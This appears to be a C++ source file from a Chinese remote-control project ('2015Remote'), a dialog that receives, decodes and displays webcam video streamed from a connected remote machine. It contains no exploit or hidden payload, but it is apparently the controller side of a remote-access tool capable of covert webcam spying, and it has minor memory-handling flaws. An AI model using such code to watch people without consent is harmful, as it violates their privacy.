// VideoDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "VideoDlg.h"
#include "afxdialogex.h"


enum
{
	IDM_SAVEAVI,					// 保存录像
};
// CVideoDlg 对话框

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)

CVideoDlg::CVideoDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(CVideoDlg::IDD, pParent)
{
	m_ContextObject = ContextObject;
	m_iocpServer = IOCPServer;
	m_BitmapInfor_Full = NULL;
	m_pVideoCodec      = NULL;     //这里忘记初始化了    我靠
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int iClientAddressLength = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&ClientAddress, &iClientAddressLength);
	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";

	m_BitmapData_Full = NULL;
	m_BitmapCompressedData_Full = NULL;
	ResetScreen();
}


void CVideoDlg::ResetScreen(void)
{
	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	int	iBitMapInforSize = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;  
	m_BitmapInfor_Full	= (LPBITMAPINFO) new BYTE[iBitMapInforSize];
	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), iBitMapInforSize); 

	m_BitmapData_Full	= new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
	m_BitmapCompressedData_Full	= new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
}

CVideoDlg::~CVideoDlg()
{
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}

	if (m_BitmapData_Full)
	{
		delete m_BitmapData_Full;
		m_BitmapData_Full = NULL;
	}

	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_BitmapCompressedData_Full)
	{
		delete m_BitmapCompressedData_Full;
		m_BitmapCompressedData_Full = NULL;
	}
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
END_MESSAGE_MAP()


// CVideoDlg 消息处理程序


BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		m_hDD = DrawDibOpen();

		m_hDC = ::GetDC(m_hWnd);

		SysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "保存录像(&V)");

		CString strString;

		strString.Format("%s - 视频管理 %d×%d", m_strIPAddress, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);

		SetWindowText(strString);

		BYTE bToken = COMMAND_NEXT;

		m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
	}

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CVideoDlg::OnClose()
{
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	CDialog::OnClose();
#if CLOSE_DELETE_DLG
	delete this;
#endif
}

void CVideoDlg::OnReceiveComplete(void)
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		{
			DrawDIB();//这里是绘图函数，转到他的代码看一下
			break;
		}
	default:
		// 传输发生异常数据
		break;
	}
}

void CVideoDlg::DrawDIB(void)
{
	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu == NULL)
		return;

	int		nHeadLen = 1 + 1 + 4;       

	LPBYTE	szBuffer = m_ContextObject->InDeCompressedBuffer.GetBuffer();
	UINT	ulBufferLen = m_ContextObject->InDeCompressedBuffer.GetBufferLength();
	if (szBuffer[1] == 0) // 没有经过H263压缩的原始数据，不需要解码
	{
		// 第一次，没有压缩，说明服务端不支持指定的解码器
		/*	if (m_nCount == 1)
		{
		pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);*/
	}

	else // 解码
	{
		////这里缓冲区里的的第二个字符正好是是否视频解码 
		InitCodec(*(LPDWORD)(szBuffer + 2)); //判断       
		if (m_pVideoCodec != NULL)
		{
			//pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_BitmapCompressedData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen);   //视频没有解压
			//这里开始解码，解码后就是同未压缩的一样了 显示到对话框上。 接下来开始视频保存成avi格式
			m_pVideoCodec->DecodeVideoData(m_BitmapCompressedData_Full, ulBufferLen - nHeadLen, 
				(LPBYTE)m_BitmapData_Full, NULL,  NULL);  //将视频数据解压到m_lpScreenDIB

			/*	m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
			(LPBYTE)m_lpScreenDIB, NULL,  NULL);  //将视频数据解压到m_lpScreenDIB*/
		}
	}

	PostMessage(WM_PAINT);
}


void CVideoDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_BitmapInfor_Full, fccHandler))     //这里忘了格式 匹配了
	{
		OutputDebugStringA("======> InitCompressor failed \n");
	}
}


void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	switch (nID)
	{
	case IDM_SAVEAVI:
		{
			break;
		}
	}

	CDialog::OnSysCommand(nID, lParam);
}


void CVideoDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting

	if (m_BitmapData_Full==NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);

	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_BitmapInfor_Full,
		m_BitmapData_Full,
		0, 0,
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);
}
